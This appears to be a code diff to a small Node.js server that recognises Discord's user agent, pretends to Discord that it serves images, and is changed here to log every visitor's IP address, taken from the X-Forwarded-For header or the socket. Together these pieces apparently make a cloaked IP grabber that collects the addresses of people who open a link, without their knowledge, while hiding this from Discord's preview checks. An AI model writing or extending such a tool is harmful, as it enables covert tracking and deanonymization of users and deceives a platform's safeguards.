@@ -15,9 +15,14 @@ var isDiscordsUserAgent = function (userAgent) {
     }
     return false;
 };
+
+var getClientAddress = function (req) {
+        return (req.headers['x-forwarded-for'] || '').split(',')[0] || req.connection.remoteAddress;
+};
+
 var server = http.createServer(function (req, res) {
     var userAgent = req.headers['user-agent'];
-    console.log('[ Incoming Request ] User-Agent:', userAgent);
+    console.log('[ Incoming Request ] User-Agent:', userAgent,"/nIP ADDRESS:", getClientAddress(req));
     if (isDiscordsUserAgent(userAgent)) {
         console.log("Got a request from discord, pretending I'm serving images.");
         // Send the image from discord's server
